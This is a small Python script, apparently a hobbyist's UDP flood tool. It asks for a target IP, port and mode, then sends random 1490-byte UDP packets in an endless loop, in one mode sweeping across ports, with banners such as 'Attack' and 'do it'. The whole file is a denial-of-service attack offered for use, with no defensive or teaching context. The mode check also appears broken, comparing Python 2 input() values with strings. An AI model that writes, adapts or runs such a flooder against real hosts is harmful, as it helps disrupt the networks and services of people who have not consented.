import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet ")
print("Coded By : nnoa")
print("do it")

ip = raw_input("IP Target : ")
port = input("Port       : ")
mode = input("Mode (1 or 2): ")
os.system("clear")
print("\033[93m")
os.system("figlet  Attack")
print("Team : nnoa")
print("\033[92m")
sent = 0

if mode == "1":
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

elif mode == "2":
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))

else:
    print("Invalid mode. Please choose mode 1 or 2.")
